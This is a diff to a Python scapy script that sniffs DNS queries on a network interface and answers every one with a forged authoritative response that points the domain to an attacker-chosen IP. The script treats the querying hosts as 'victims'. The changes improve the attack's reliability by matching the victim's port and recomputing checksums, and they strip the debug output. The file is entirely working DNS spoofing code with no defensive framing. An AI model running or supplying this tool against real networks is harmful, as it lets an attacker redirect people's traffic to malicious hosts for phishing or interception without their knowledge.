@@ -1,50 +1,60 @@
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
 
 def spoof_dns_packet(pkt, fake_ip, iface):
-    print("\n[>] Intercepted packet...")
-
-    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
+    if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNS].qr == 0:
         try:
             queried_domain = pkt[DNSQR].qname.decode().strip(".")
             victim_ip = pkt[IP].src
+            victim_port = pkt[UDP].sport
             dns_id = pkt[DNS].id
-            print("[*] DNS query from {} for domain: {}".format(victim_ip, queried_domain))
 
-            # Debug: Show original DNS packet summary
-            pkt.show()
+            print("\n[>] Intercepted DNS query from {} for {}".format(victim_ip, queried_domain))
 
-            # Build spoofed DNS response
-            ip = IP(src=pkt[IP].dst, dst=victim_ip)
-            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
-            dns = DNS(
-                id=dns_id,
-                qr=1,       # Response
-                aa=1,       # Authoritative
-                ra=1,       # Recursion available
-                qd=pkt[DNS].qd,
-                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)
+            ip_layer = IP(src=pkt[IP].dst, dst=victim_ip)
+            udp_layer = UDP(sport=pkt[UDP].dport, dport=victim_port)
+
+            dns_answer = DNSRR(
+                rrname=pkt[DNSQR].qname,
+                type="A",
+                rclass="IN",
+                ttl=300,
+                rdata=fake_ip
             )
 
-            spoofed_response = ip / udp / dns
-            spoofed_response = spoofed_response.__class__(bytes(spoofed_response))
+            dns_layer = DNS(
+                id=dns_id,
+                qr=1,
+                aa=1,
+                rd=pkt[DNS].rd,
+                ra=1,
+                qd=pkt[DNS].qd,
+                an=dns_answer,
+                ancount=1,
+                nscount=0,
+                arcount=0
+            )
 
-            print("[+] Sending spoofed response with:")
-            print("    - DNS ID: {}".format(dns_id))
-            print("    - Spoofed IP: {}".format(fake_ip))
-            print("    - Destination IP: {}".format(victim_ip))
-            spoofed_response.show()
+            spoofed_response = ip_layer / udp_layer / dns_layer
 
-            send(spoofed_response, iface=iface, verbose=True)
-            print("[+] Spoofed DNS response sent successfully.")
+            del spoofed_response[IP].len
+            del spoofed_response[IP].chksum
+            del spoofed_response[UDP].len
+            del spoofed_response[UDP].chksum
+
+            send(spoofed_response, iface=iface, verbose=0)
+            print("[+] Sent spoofed response to {} with fake IP {}".format(victim_ip, fake_ip))
 
         except Exception as e:
-            print("[!] Error: {}".format(e))
-            pkt.show()
+            print("[!] Error processing DNS packet: {}".format(e))
+    else:
+        pass
 
 def start_dns_spoofer(fake_ip, iface):
-    print("[*] Starting DNS spoofing (ALL domains)...")
-    print("[*] Responding with fake IP: {}".format(fake_ip))
-    print("[*] Listening on interface: {}\n".format(iface))
+    print("[*] DNS spoofing started")
+    print("[*] Fake IP to inject: {}".format(fake_ip))
+    print("[*] Listening on interface: {}".format(iface))
+
+    conf.iface = iface
 
     try:
         sniff(
@@ -54,4 +64,6 @@ def start_dns_spoofer(fake_ip, iface):
             store=False
         )
     except KeyboardInterrupt:
-        print("\n[!] DNS spoofing stopped by user.")
+        print("\n[!] DNS spoofing stopped.")
+    except Exception as e:
+        print("[!] Error during sniffing: {}".format(e))
